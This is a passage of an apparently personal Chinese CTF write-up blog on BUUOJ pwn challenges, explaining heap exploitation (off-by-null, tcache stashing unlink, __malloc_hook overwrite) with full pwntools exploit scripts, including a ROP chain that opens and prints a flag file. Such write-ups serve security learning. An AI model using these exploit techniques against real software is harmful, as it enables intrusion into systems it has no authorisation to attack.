<h2 id="cmcc-simplerop"><a href="#cmcc-simplerop" class="headerlink" title="cmcc_simplerop"></a>cmcc_simplerop</h2><p>这道题用的是int 80的系统调用</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">int80</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span>null<span class="token punctuation">,</span>null<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>　　后面的四个参数分别是<strong>eax</strong>、<strong>ebx</strong>、<strong>ecx</strong>、<strong>edx</strong>。</p>
<h2 id="ciscn-2019-n-3"><a href="#ciscn-2019-n-3" class="headerlink" title="ciscn_2019_n_3"></a>ciscn_2019_n_3</h2><p>改堆的free函数为system@plt，然后再改内容为&#x2F;sh，应该是可以getshell的，但是不知道为什么调试一直显示共享库损坏，就不写了</p>
<p>strchr寻找字符出现的地方</p>
<h2 id="babyfengshui-33c3-2016"><a href="#babyfengshui-33c3-2016" class="headerlink" title="babyfengshui_33c3_2016"></a>babyfengshui_33c3_2016</h2><p>首先是一个off-by-null的漏洞</p>
<p>那么应该是一个unlink然后通过unlink后的堆块，来改一个结构堆块的内容为free@got，之后改这个内容的内容堆块，即改free@go表为system然后再传入一个&#x2F;bin&#x2F;sh\x00就行了</p>
<p>但是我看了wp，发现我的思路有点过于复杂了，他的des的大小判断是根据堆块越界来看的，我们可以不让结构堆块和des堆块连在一起，就能实现越界到另一个结构堆块上</p>
<p>可以通过show函数来泄露libc基址，就越界覆盖一个free@got来show</p>
<h2 id="hitcon-ctf-2019-one-punch"><a href="#hitcon-ctf-2019-one-punch" class="headerlink" title="hitcon_ctf_2019_one_punch"></a>hitcon_ctf_2019_one_punch</h2><p>冷知识：calloc不会从tcachebin里面取堆块</p>
<p>​	首先大概的思路是先泄露libc基址，这个可以通过show unsortedbin来泄露，再泄露heap基址，之后便是构造<code>tcache stashing unlink attack</code>，之后再修改<code>__malloc_hook</code>为add rsp###,ret然后在栈中构造ROP链</p>
<p>​	仔细说一下tcache的unlink attack，它是先申请相同size的两个smallbin和tcachebin，然后再用calloc拿掉一个smallbin的时候会将剩下的smallbin放进tcachebin里，而且其中几乎没有什么check，那么我们就可以在拿取之前将smallbin的bk改成目标地址，但是要保证fd链是正确的，就可以在target-0x10上覆盖一个地址，算是大数组，也可以字节错位来实现一些小目标</p>
<h3 id="首先这题有几个问题"><a href="#首先这题有几个问题" class="headerlink" title="首先这题有几个问题"></a>首先这题有几个问题</h3><h3 id="magic函数的判定寻找过程"><a href="#magic函数的判定寻找过程" class="headerlink" title="magic函数的判定寻找过程"></a>magic函数的判定寻找过程</h3><p>首先是<code>qword_4030</code>是位于bss段上的，那么vmmap上找第一个RW段，就是bss段，然后以基址往后30就是该值，之后+0x20即在这个地址上的值加上0x20</p>
<h3 id="还有tcache结构堆块的结构"><a href="#还有tcache结构堆块的结构" class="headerlink" title="还有tcache结构堆块的结构"></a>还有tcache结构堆块的结构</h3><p>tcache结构是第一个malloc或calloc的堆块的时候初始化形成的，首先是couts数组，然后才是tcache堆，而这个couts的存储大小有1字节和2字节之分，区分于版本的大小，在较低版本都是1字节，较高版本是2字节</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>
sh<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./2019_one_punch'</span><span class="token punctuation">)</span>
context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>

sla <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span>y<span class="token punctuation">:</span>sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>
sa  <span class="token operator">=</span> <span class="token keyword">lambda</span> x<span class="token punctuation">,</span>y<span class="token punctuation">:</span>sh<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>
su  <span class="token operator">=</span> <span class="token keyword">lambda</span> x  <span class="token punctuation">:</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sl  <span class="token operator">=</span> <span class="token keyword">lambda</span> x  <span class="token punctuation">:</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">magic</span><span class="token punctuation">(</span>content<span class="token operator">=</span><span class="token builtin">bytearray</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">b'> '</span><span class="token punctuation">,</span><span class="token string">b'50086'</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span>content<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>idx<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">,</span>size<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token builtin">bytearray</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">b'> '</span><span class="token punctuation">,</span><span class="token string">b'1'</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">b'idx: '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">b'hero name: '</span><span class="token punctuation">,</span>size<span class="token operator">*</span>content<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">rename</span><span class="token punctuation">(</span>idx<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">,</span>content<span class="token operator">=</span><span class="token builtin">bytearray</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">b'> '</span><span class="token punctuation">,</span><span class="token string">b'2'</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">b'idx: '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">b'hero name: '</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>idx<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">b'> '</span><span class="token punctuation">,</span><span class="token string">b'3'</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">b'idx: '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>idx<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">b'> '</span><span class="token punctuation">,</span><span class="token string">b'4'</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">b'idx: '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">malloc</span><span class="token punctuation">(</span>content<span class="token operator">=</span><span class="token builtin">bytearray</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    sla<span class="token punctuation">(</span><span class="token string">b'> '</span><span class="token punctuation">,</span><span class="token string">b'50056'</span><span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span>content<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>sh<span class="token punctuation">)</span>
    pause<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x120</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token punctuation">)</span>
    delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
<span class="token comment">#debug()</span>
show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
recvdata2<span class="token operator">=</span>u64<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
heap_base<span class="token operator">=</span>recvdata2 <span class="token operator">&amp;</span> <span class="token number">0xFFFFFFFFF000</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"heap_base_addr======>"</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>heap_base<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment">#debug()</span>
add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x120</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x120</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
<span class="token comment">#debug()</span>
show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'hero name: '</span><span class="token punctuation">)</span>
recvdata1<span class="token operator">=</span>u64<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
main_arena_addr<span class="token operator">=</span>recvdata1<span class="token operator">-</span><span class="token number">96</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"mainarena==========>"</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>main_arena_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
libc_base<span class="token operator">=</span>main_arena_addr<span class="token operator">-</span><span class="token number">0x1ECB80</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"libc_base_addr==========>"</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment">#debug()</span>
<span class="token comment">#-------------------------------------------------------------</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0xf0</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token punctuation">)</span>
    delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x400</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token punctuation">)</span>
    delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>

add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x400</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x400</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x400</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0x400</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token punctuation">)</span>

delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>

add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0x300</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0x300</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token punctuation">)</span>

<span class="token comment">#debug()</span>
delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token comment">##改这个的bk</span>

add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0x300</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token punctuation">)</span>
add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0x300</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token punctuation">)</span>
<span class="token comment">#debug()</span>
<span class="token comment">#-------------------------------------------</span>
fd<span class="token operator">=</span>heap_base<span class="token operator">+</span><span class="token number">0x31C0</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"fd==>"</span><span class="token punctuation">,</span>fd<span class="token punctuation">)</span>
fake_bk<span class="token operator">=</span>heap_base<span class="token operator">+</span><span class="token number">0x30</span><span class="token operator">-</span><span class="token number">0x10</span><span class="token operator">-</span><span class="token number">5</span>
pal<span class="token operator">=</span><span class="token number">0x300</span><span class="token operator">*</span><span class="token string">b'a'</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x101</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>fake_bk<span class="token punctuation">)</span>
rename<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>pal<span class="token punctuation">)</span>
<span class="token comment">#debug()</span>
<span class="token comment">#------------------------------------------</span>
add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x217</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token punctuation">)</span>
delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
<span class="token comment">#debug()</span>
malloc_hook<span class="token operator">=</span>main_arena_addr<span class="token operator">-</span><span class="token number">0x10</span>
rename<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>malloc_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>

add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0xf0</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token punctuation">)</span>     <span class="token comment">##要先放到tcache才能改tcache的数量，不然放不进去，然后再magic</span>
debug<span class="token punctuation">(</span><span class="token punctuation">)</span>
magic<span class="token punctuation">(</span><span class="token string">b'a'</span><span class="token punctuation">)</span>
debug<span class="token punctuation">(</span><span class="token punctuation">)</span>
magic<span class="token punctuation">(</span><span class="token string">b'a'</span><span class="token punctuation">)</span>
debug<span class="token punctuation">(</span><span class="token punctuation">)</span>

magic_gadget <span class="token operator">=</span> libc_base<span class="token operator">+</span><span class="token number">0x000000000008cfd6</span>
payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>magic_gadget<span class="token punctuation">)</span>
magic<span class="token punctuation">(</span>payload<span class="token punctuation">)</span> <span class="token comment"># __malloc_hook --> gadget(add rsp,0x48)</span>

p_rdi <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x0000000000026542</span>
p_rsi <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x0000000000026f9e</span>
p_rdx <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x000000000012bda6</span>
p_rax <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x0000000000047cf8</span>
syscall <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x00000000000cf6c5</span>
rop_heap <span class="token operator">=</span> heap_base <span class="token operator">+</span> <span class="token number">0x44b0</span> <span class="token comment"># './flag' </span>

<span class="token comment"># bad syscall</span>
<span class="token comment"># rops = p64(p_rdi)+p64(rop_heap) + p64(p_rsi)+p64(0)</span>
<span class="token comment"># rops += p64(libc.sym['open']+libc_base)</span>
<span class="token comment"># rops += p64(p_rdi)+p64(3)+p64(p_rsi)+p64(heap_base+0x260)+p64(p_rdx)+p64(0x70)</span>
<span class="token comment"># rops += p64(libc.sym['read']+libc_base)</span>
<span class="token comment"># rops += p64(p_rdi)+p64(1)+p64(p_rsi)+p64(heap_base+0x260)+p64(p_rdx)+p64(0x70)</span>
<span class="token comment"># rops += p64(libc.sym['write']+libc_base)</span>

rops <span class="token operator">=</span> p64<span class="token punctuation">(</span>p_rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>rop_heap<span class="token punctuation">)</span>
rops <span class="token operator">+=</span> p64<span class="token punctuation">(</span>p_rsi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
rops <span class="token operator">+=</span> p64<span class="token punctuation">(</span>p_rdx<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
rops <span class="token operator">+=</span> p64<span class="token punctuation">(</span>p_rax<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
rops <span class="token operator">+=</span> p64<span class="token punctuation">(</span>syscall<span class="token punctuation">)</span>
<span class="token comment">#rops += p64(libc.sym['open'])</span>
<span class="token comment">#read</span>
rops <span class="token operator">+=</span> p64<span class="token punctuation">(</span>p_rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>
rops <span class="token operator">+=</span> p64<span class="token punctuation">(</span>p_rsi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>heap_base<span class="token operator">+</span><span class="token number">0x260</span><span class="token punctuation">)</span>
rops <span class="token operator">+=</span> p64<span class="token punctuation">(</span>p_rdx<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x70</span><span class="token punctuation">)</span>
rops <span class="token operator">+=</span> p64<span class="token punctuation">(</span>p_rax<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
rops <span class="token operator">+=</span> p64<span class="token punctuation">(</span>syscall<span class="token punctuation">)</span>
<span class="token comment">#rops += p64(libc.sym['read'])</span>
<span class="token comment">#write</span>
rops <span class="token operator">+=</span> p64<span class="token punctuation">(</span>p_rdi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
rops <span class="token operator">+=</span> p64<span class="token punctuation">(</span>p_rsi<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>heap_base<span class="token operator">+</span><span class="token number">0x260</span><span class="token punctuation">)</span>
rops <span class="token operator">+=</span> p64<span class="token punctuation">(</span>p_rdx<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x70</span><span class="token punctuation">)</span>
rops <span class="token operator">+=</span> p64<span class="token punctuation">(</span>p_rax<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
rops <span class="token operator">+=</span> p64<span class="token punctuation">(</span>syscall<span class="token punctuation">)</span>

<span class="token comment"># dbs("b *__malloc_hook")</span>
sla<span class="token punctuation">(</span><span class="token string">b'> '</span><span class="token punctuation">,</span><span class="token string">b'1'</span><span class="token punctuation">)</span>
sla<span class="token punctuation">(</span><span class="token string">b'idx: '</span><span class="token punctuation">,</span><span class="token string">b'0'</span><span class="token punctuation">)</span>
sla<span class="token punctuation">(</span><span class="token string">b'hero name: '</span><span class="token punctuation">,</span>rops<span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>



sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="metasequoia-2020-summoner"><a href="#metasequoia-2020-summoner" class="headerlink" title="metasequoia_2020_summoner"></a>metasequoia_2020_summoner</h2><p>本题其实只是一个纸老虎<img src="https://cdn.jsdelivr.net/gh/BAMBOOiii/photo@main/img/202403132059144.png" alt="image-20240311224248322"></p>
<p>这便是题目的大意</p>
<p>但是他在free的时候free的其实是存储name的堆块，因此就很好构造</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node5.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">29952</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">cmd</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>
	sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'> '</span><span class="token punctuation">)</span>
	sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>s<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">summon</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>
	sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'> '</span><span class="token punctuation">,</span> <span class="token string">b'summon '</span> <span class="token operator">+</span> name<span class="token punctuation">)</span>
	sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">release</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
	sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'> '</span><span class="token punctuation">,</span> <span class="token string">b'release'</span><span class="token punctuation">)</span>
	sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Released.\n'</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">strike</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
	sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'> '</span><span class="token punctuation">,</span> <span class="token string">b'strike'</span><span class="token punctuation">)</span>

fake<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">8</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>

summon<span class="token punctuation">(</span>fake<span class="token punctuation">)</span>
release<span class="token punctuation">(</span><span class="token punctuation">)</span>
summon<span class="token punctuation">(</span><span class="token string">b'aaaa'</span><span class="token punctuation">)</span>
strike<span class="token punctuation">(</span><span class="token punctuation">)</span>

sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>


          <div class="post-tags">
            <!-- 文章tags -->
            
          </div>
          <p class="motto">重拾纯粹的写作</p>
        </article>
        <!-- 评论 -->
        <div id="vcomments"></div>
      </div>
    </main>
    <!-- toc -->
    
    <cosy-drag-box id="toc-drag-box" trigger="left" min-width="220" uid="toc-box">
      <div class="meta-container">
        <div class="toc-wrapper cosy-scrollbar">
          <p class="catalog">
            <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 24 24">
              <g fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                <path d="M4 6h16"></path>
                <path d="M4 12h16"></path>
                <path d="M4 18h12"></path>
              </g>
            </svg>
            <span>目录</span>
          </p>
          <!-- 文章toc -->
          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#buu%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%951"><span class="toc-number">1.</span> <span class="toc-text">buu做题记录1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42019-%E5%86%B3%E8%B5%9B-PWN5"><span class="toc-number">1.1.</span> <span class="toc-text">[第五空间2019 决赛]PWN5</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90"><span class="toc-number">1.1.1.</span> <span class="toc-text">静态分析</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rctf-2019-babyheap"><span class="toc-number">1.2.</span> <span class="toc-text">rctf-2019-babyheap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ciscn-2019-c-1"><span class="toc-number">1.3.</span> <span class="toc-text">ciscn_2019_c_1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ciscn-2019-n-5"><span class="toc-number">1.4.</span> <span class="toc-text">ciscn_2019_n_5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ciscn-2019-en-2"><span class="toc-number">1.5.</span> <span class="toc-text">ciscn_2019_en_2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#not-the-same-3dsctf-2016"><span class="toc-number">1.6.</span> <span class="toc-text">not_the_same_3dsctf_2016</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ropper"><span class="toc-number">1.6.1.</span> <span class="toc-text">ropper</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E8%A7%A3"><span class="toc-number">1.6.2.</span> <span class="toc-text">二解</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#iscn-2019-ne-5"><span class="toc-number">1.7.</span> <span class="toc-text">iscn_2019_ne_5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2018-rop"><span class="toc-number">1.8.</span> <span class="toc-text">2018_rop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bjdctf-2020-babyrop"><span class="toc-number">1.9.</span> <span class="toc-text">bjdctf_2020_babyrop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bjdctf-2020-babystack2"><span class="toc-number">1.10.</span> <span class="toc-text">bjdctf_2020_babystack2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jarvisoj-fm"><span class="toc-number">1.11.</span> <span class="toc-text">jarvisoj_fm</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jarvisoj-tell-me-something"><span class="toc-number">1.12.</span> <span class="toc-text">jarvisoj_tell_me_something</span></a></li><li 